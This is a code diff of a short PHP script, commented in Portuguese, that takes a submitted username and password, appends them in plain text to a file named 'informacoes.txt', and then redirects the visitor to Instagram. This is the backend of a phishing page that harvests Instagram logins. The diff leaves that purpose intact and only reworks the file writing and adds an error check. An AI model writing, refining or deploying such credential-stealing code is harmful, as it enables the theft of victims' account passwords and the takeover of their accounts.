@@ -5,17 +5,24 @@ if(isset($_POST['username']) && isset($_POST['password'])) {
     $username = $_POST['username'];
     $password = $_POST['password'];
     
-    // Abre ou cria o arquivo onde as informações serão salvas
-    $file = fopen("informacoes.txt", "a");
+    // Define o nome do arquivo onde as informações serão salvas
+    $file = "informacoes.txt";
     
-    // Escreve as informações de usuário e senha no arquivo
-    fwrite($file, "Usuário: " . $username . " - Senha: " . $password . "\n");
+    // Formata os dados a serem escritos no arquivo
+    $data = "Usuário: " . $username . " - Senha: " . $password . "\n";
     
-    // Fecha o arquivo
-    fclose($file);
-    
-    // Redireciona o usuário para outra página
-    header("Location: https://www.instagram.com/");
-    exit();
+    // Abre o arquivo em modo de escrita e verifica se foi aberto com sucesso
+    if($handle = fopen($file, 'a')) {
+        // Escreve os dados no arquivo e fecha o arquivo
+        fwrite($handle, $data);
+        fclose($handle);
+        
+        // Redireciona o usuário para outra página
+        header("Location: https://www.instagram.com");
+        exit();
+    } else {
+        // Se não foi possível abrir o arquivo, exibe uma mensagem de erro
+        echo "Erro ao abrir o arquivo.";
+    }
 }
 ?>
